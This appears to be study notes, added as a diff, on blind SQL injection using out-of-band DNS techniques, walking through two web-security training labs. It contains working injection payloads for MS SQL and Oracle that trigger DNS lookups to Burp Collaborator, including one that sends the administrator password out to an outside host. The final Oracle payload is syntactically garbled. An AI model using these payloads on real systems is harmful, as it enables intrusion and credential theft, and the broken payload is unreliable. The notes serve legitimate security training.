@@ -1,0 +1,60 @@
+Exploiting blind SQL injection using out-of-band (OAST) techniques:
+
+An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.
+
+In this situation, it is possible to exploit the blind SQLi vulnerability by triggering out-of-band network interactions on a system that we control. These can be triggered based on an injected condition to get one piece of info at a time. More usefully, data can be exfiltrated directly within the network interaction.
+
+A variety of network protocols can be used for this type of attacks. The most effective is DNS (domain name service). Many production networks allow free execution of DNS queries, because they're essential for the normal operation of production systems.
+
+
+The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows us to detect when network interactions occur as a result of sending individual payloads to a vulnerable application.
+
+The techniques for triggering a DNS query are specific to the type of db being used. For example, the following input on MS SQL Server can be used to cause a DNS lookup on a specific domain: '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+
+This causes the db to perform a lookup for the following domain:0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+
+----------------------------------------------------------------------------------------------------------------------
+
+Lab: Blind SQL injection with out-of-band interaction
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+
+Unfortunately, we need to have the professional version on Burp Suite to complete this lab. 
+
+We capture a request as always. Also, we open the Burp collaborator and copy the subdomain that we got by clicking copy to clipboard. This will give us a subdomain that ends with burpcollaborator.net.
+
+We go to the cheat sheet and go down to the DNS lookup section. Every type of SQL db has its own syntax for a DNS lookup. We will first try Oracle:'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
+
+We put this in Repeater next to the TrackingId. Then we press send. immediately after that we open the Burp Collaborator tab and press poll now. We indeed get a DNS lookup. 
+
+
+----------------------------------------------------------------------------------------------------------------------
+
+Since we now know how to trigger out-of-band interactions, we can use the out-of-band channel to exfiltrate data. For example: '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+
+
+This will read the password for Administrator, append a unique Collaborator subdomain, and triggers a DNS lookup. 
+
+----------------------------------------------------------------------------------------------------------------------
+
+Lab: Blind SQL injection with out-of-band data exfiltration
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+
+We will do the exact same thing but with different payload this time. We will use the DNS lookup with data exfiltration for Oracle since we know it is Oracle db from the last lab:'||(SELECT password from users where username='Administrator'(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
+
+We will get the password of Administrator.
+
+
+
